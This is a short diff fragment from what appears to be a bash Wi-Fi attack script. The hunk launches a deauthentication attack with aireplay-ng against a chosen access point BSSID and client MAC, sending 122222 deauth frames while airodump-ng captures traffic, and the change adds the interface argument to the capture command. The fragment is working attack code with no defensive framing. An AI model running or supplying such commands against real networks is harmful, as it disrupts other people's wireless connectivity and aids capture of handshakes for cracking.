@@ -313,7 +313,7 @@ read -p ' interface : ' interfaceda
 clear
 echo -e  '\e[1;32m '
 echo attack started ... 
-xterm -title "Deauthentication-Attack" -e aireplay-ng -0 122222 -a $bssidda -c $macda $interfaceda | xterm -title "Deauthentication-Attack" -e airodump-ng
+xterm -title "Deauthentication-Attack" -e aireplay-ng -0 122222 -a $bssidda -c $macda $interfaceda | xterm -title "Deauthentication-Attack" -e airodump-ng $interfaceda
 fi
 
 
